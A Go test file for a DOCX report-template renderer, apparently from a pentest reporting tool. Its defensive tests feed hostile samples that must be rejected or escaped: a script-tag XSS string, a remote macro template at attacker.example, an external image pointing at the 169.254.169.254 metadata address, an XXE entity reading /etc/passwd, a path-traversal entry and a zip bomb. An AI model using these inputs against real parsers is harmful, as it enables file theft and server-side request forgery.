package docx

import (
	"archive/zip"
	"bytes"
	"errors"
	"io"
	"strings"
	"testing"
)

const docOpen = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>`
const docClose = `<w:sectPr/></w:body></w:document>`

func docWith(body string) []byte {
	return buildPackage(map[string]string{"word/document.xml": docOpen + body + docClose})
}

func readPart(t *testing.T, data []byte, name string) string {
	t.Helper()
	zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		t.Fatalf("output is not a zip: %v", err)
	}
	for _, f := range zr.File {
		if f.Name == name {
			rc, _ := f.Open()
			b, _ := io.ReadAll(rc)
			_ = rc.Close()
			return string(b)
		}
	}
	t.Fatalf("part %s missing", name)
	return ""
}

func render(t *testing.T, tpl []byte, data Data) string {
	t.Helper()
	out, _, err := Render(tpl, data, false)
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	doc := readPart(t, out, "word/document.xml")
	if err := wellFormed(doc); err != nil {
		t.Fatalf("rendered document is not well-formed: %v\n%s", err, doc)
	}
	return doc
}

func TestRender_ValuesAreEscapedAndLinesBreak(t *testing.T) {
	doc := render(t, docWith(para("Client: {client.name}", "")), Data{
		"client": map[string]any{"name": "<script>alert(1)</script> & Co\nline two"},
	})
	if strings.Contains(doc, "<script>") {
		t.Fatal("value was not escaped")
	}
	if !strings.Contains(doc, "&lt;script&gt;alert(1)&lt;/script&gt; &amp; Co") || !strings.Contains(doc, "<w:br/>") {
		t.Fatalf("unexpected output: %s", doc)
	}
}

func TestRender_TagSplitAcrossRuns(t *testing.T) {
	// Word often splits a tag over runs (spell check, an edit, formatting).
	body := `<w:p>` + run("Name: {camp", "<w:b/>") + run("aign.na", "") + run("me} end", "") + `</w:p>`
	doc := render(t, docWith(body), Data{"campaign": map[string]any{"name": "Acme"}})
	if !strings.Contains(doc, "Acme") || strings.Contains(doc, "{") {
		t.Fatalf("split tag not rendered: %s", doc)
	}
	if !strings.Contains(doc, "<w:b/>") {
		t.Fatal("the first run's formatting was lost")
	}
}

func TestRender_ParagraphAndRowLoopsAndInverted(t *testing.T) {
	body := para("{#findings}", "") + para("Finding {number}: {title}", "") + para("{/findings}", "") +
		para("{^findings}", "") + para("Nothing found", "") + para("{/findings}", "") +
		table(row(cell("Title", ""), cell("Sev", "")), row(cell("{#findings}{title}", ""), cell("{severity}{/findings}", "")))
	data := Data{"findings": []map[string]any{
		{"number": "1", "title": "SQLi", "severity": "critical"},
		{"number": "2", "title": "XSS", "severity": "high"},
	}}
	doc := render(t, docWith(body), data)
	for _, want := range []string{"Finding ", "SQLi", "XSS", "critical", "high"} {
		if !strings.Contains(doc, want) {
			t.Fatalf("missing %q in %s", want, doc)
		}
	}
	if strings.Count(doc, "<w:tr>") != 3 {
		t.Fatalf("want header + 2 repeated rows, got %d rows", strings.Count(doc, "<w:tr>"))
	}
	if strings.Contains(doc, "Nothing found") {
		t.Fatal("inverted section shown although findings exist")
	}

	empty := render(t, docWith(body), Data{"findings": []map[string]any{}})
	if !strings.Contains(empty, "Nothing found") {
		t.Fatal("inverted section hidden although there are no findings")
	}
	if strings.Count(empty, "<w:tr>") != 1 {
		t.Fatalf("zero findings should leave only the header row, got %d", strings.Count(empty, "<w:tr>"))
	}
}

func TestRender_InlineSectionAndStringList(t *testing.T) {
	body := para("{#cwe}CWE: {cwe}{/cwe}", "") + para("{#targets}", "") + para("- {.}", "") + para("{/targets}", "")
	doc := render(t, docWith(body), Data{"cwe": "", "targets": []string{"a.example.com", "b.example.com"}})
	if strings.Contains(doc, "CWE:") {
		t.Fatal("inline section with an empty value was shown")
	}
	if !strings.Contains(doc, "a.example.com") || !strings.Contains(doc, "b.example.com") {
		t.Fatalf("string list not repeated: %s", doc)
	}
}

func TestRender_EmptyCellKeepsAParagraph(t *testing.T) {
	body := table(row(`<w:tc>` + para("{#items}", "") + para("{.}", "") + para("{/items}", "") + `</w:tc>`))
	doc := render(t, docWith(body), Data{"items": []string{}})
	if !strings.Contains(doc, "<w:tc><w:p/></w:tc>") {
		t.Fatalf("an emptied cell must keep a paragraph: %s", doc)
	}
}

func TestRender_Markdown(t *testing.T) {
	md := "Some **bold** and `code` text.\n\n- first\n- second\n\n```\nGET / HTTP/1.1\n```"
	doc := render(t, docWith(para("{@description}", "")), Data{"description": md})
	for _, want := range []string{"<w:b/>", "Consolas", "• first", "GET / HTTP/1.1", "bold"} {
		if !strings.Contains(doc, want) {
			t.Fatalf("markdown output lacks %q: %s", want, doc)
		}
	}
	if strings.Contains(doc, "**") {
		t.Fatal("markdown markers left in the output")
	}
}

func TestRender_StrictReportsUnknownPaths(t *testing.T) {
	_, info, err := Render(docWith(para("{campaign.nmae}", "")), Data{"campaign": map[string]any{"name": "x"}}, true)
	if err != nil {
		t.Fatal(err)
	}
	if len(info.Warnings) != 1 || !strings.Contains(info.Warnings[0], "campaign.nmae") {
		t.Fatalf("warnings = %v", info.Warnings)
	}
}

func TestStarterTemplate_InspectsAndRenders(t *testing.T) {
	info, err := Inspect(StarterTemplate())
	if err != nil {
		t.Fatalf("starter template is invalid: %v", err)
	}
	if len(info.Tags) == 0 {
		t.Fatal("no tags found in the starter template")
	}
	data := Data{
		"report":   map[string]any{"title": "Technical report"},
		"campaign": map[string]any{"name": "Acme", "description": "desc"},
		"labels":   map[string]any{"summary": "Summary"},
		"findings": []map[string]any{{"number": "1", "title": "SQLi", "severity_label": "Critical", "steps": []string{"step one"}, "has_steps": true, "poc": "curl x"}},
	}
	doc := render(t, StarterTemplate(), data)
	if !strings.Contains(doc, "SQLi") || !strings.Contains(doc, "step one") || !strings.Contains(doc, "curl x") {
		t.Fatalf("starter render is missing finding content")
	}
	if strings.Contains(doc, "{") {
		t.Fatal("a tag was left unrendered")
	}
}

func TestInspect_TemplateErrors(t *testing.T) {
	cases := map[string]string{
		"unclosed":        para("{#findings}", ""),
		"mismatched":      para("{#a}", "") + para("{/b}", ""),
		"stray close":     para("{/a}", ""),
		"markdown inline": para("Text {@description}", ""),
		"image":           para("{%logo}", ""),
		"cross level":     para("{#a}", "") + table(row(cell("{/a}", ""))),
	}
	for name, body := range cases {
		if _, err := Inspect(docWith(body)); !errors.Is(err, ErrInvalidTemplate) {
			t.Errorf("%s: err = %v, want ErrInvalidTemplate", name, err)
		}
	}
}

// Package checks: a template is untrusted input.
func TestInspect_RefusesUnsafePackages(t *testing.T) {
	good := docOpen + para("x", "") + docClose
	withParts := func(extra map[string]string) []byte {
		parts := map[string]string{"word/document.xml": good}
		for k, v := range extra {
			parts[k] = v
		}
		return buildPackage(parts)
	}
	cases := map[string][]byte{
		"not a zip":     []byte("hello, this is not a docx"),
		"empty":         {},
		"macro project": withParts(map[string]string{"word/vbaProject.bin": "x"}),
		"activex":       withParts(map[string]string{"word/activeX/activeX1.xml": "<x/>"}),
		"embedded ole":  withParts(map[string]string{"word/embeddings/oleObject1.bin": "x"}),
		"external template": withParts(map[string]string{"word/_rels/settings.xml.rels": `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
			`<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/></Relationships>`}),
		"external image": withParts(map[string]string{"word/_rels/document.xml.rels": `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
			`<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://169.254.169.254/x.png" TargetMode="External"/></Relationships>`}),
		"doctype":   withParts(map[string]string{"word/document.xml": `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>` + good[len(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>`):]}),
		"traversal": withParts(map[string]string{"../evil.xml": "<x/>"}),
		"macroEnabled": withParts(map[string]string{"[Content_Types].xml": `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">` +
			`<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>`}),
		"no document": buildPackage(map[string]string{"word/other.xml": "<x/>"}),
	}
	for name, data := range cases {
		if _, err := Inspect(data); !errors.Is(err, ErrInvalidTemplate) {
			t.Errorf("%s: err = %v, want ErrInvalidTemplate", name, err)
		}
	}

	// An external hyperlink is fine.
	link := withParts(map[string]string{"word/_rels/document.xml.rels": `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
		`<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/></Relationships>`})
	if _, err := Inspect(link); err != nil {
		t.Errorf("external hyperlink refused: %v", err)
	}
}

func TestInspect_RefusesZipBomb(t *testing.T) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, name := range []string{"[Content_Types].xml", "word/document.xml"} {
		f, _ := zw.Create(name)
		_, _ = f.Write([]byte("<x/>"))
	}
	f, _ := zw.Create("word/media/big.bin")
	chunk := make([]byte, 1<<20)
	for i := 0; i < (maxEntryBytes>>20)+2; i++ {
		_, _ = f.Write(chunk) // zeros compress to almost nothing
	}
	_ = zw.Close()
	if buf.Len() > MaxTemplateBytes {
		t.Skip("compressed bomb larger than the upload limit")
	}
	if _, err := Inspect(buf.Bytes()); !errors.Is(err, ErrInvalidTemplate) {
		t.Fatalf("err = %v, want ErrInvalidTemplate", err)
	}
}

func TestRender_OutputBound(t *testing.T) {
	items := make([]string, 50_000)
	for i := range items {
		items[i] = strings.Repeat("x", 2000)
	}
	_, _, err := Render(docWith(para("{#items}", "")+para("{.}", "")+para("{/items}", "")), Data{"items": items}, false)
	if !errors.Is(err, ErrOutputTooLarge) {
		t.Fatalf("err = %v, want ErrOutputTooLarge", err)
	}
}
